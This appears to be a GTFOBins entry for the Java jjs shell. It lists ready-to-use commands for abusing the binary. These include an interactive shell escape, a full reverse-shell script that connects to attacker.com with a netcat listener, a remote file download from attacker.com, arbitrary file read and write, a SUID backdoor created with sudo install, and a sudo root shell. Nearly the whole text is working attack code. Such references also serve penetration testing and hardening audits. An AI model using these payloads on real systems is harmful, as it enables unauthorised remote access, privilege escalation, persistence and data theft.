# GTFOBin: jjs

This tool is installed starting with Java SE 8.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type("java.lang.System").getenv("RHOST");
var port=Java.type("java.lang.System").getenv("RPORT");
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var Socket = Java.type("java.net.Socket");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo "var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();" | jjs
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("./file_to_write");
fw.write("DATA");
fw.close();' | jjs
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("file_to_read"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

This has been found working in macOS but failing on Linux systems.

```
sudo install -m =xs $(which jjs) .

echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
```